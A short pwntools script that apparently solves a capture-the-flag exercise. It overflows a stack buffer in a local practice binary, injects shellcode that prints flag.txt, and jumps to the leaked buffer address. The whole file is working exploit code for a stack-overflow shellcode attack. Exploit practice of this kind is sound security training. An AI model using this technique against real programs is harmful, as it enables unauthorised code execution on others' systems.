#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

p = process("./stack_shellcode_nx_off")
buf = int(p.recvline().split(b" @ ")[1], 16)

shellcode = asm(shellcraft.cat("flag.txt") + shellcraft.exit())

payload = shellcode
payload += b"A" * (72 - len(shellcode))
payload += p64(buf)

p.send(payload)
p.interactive()
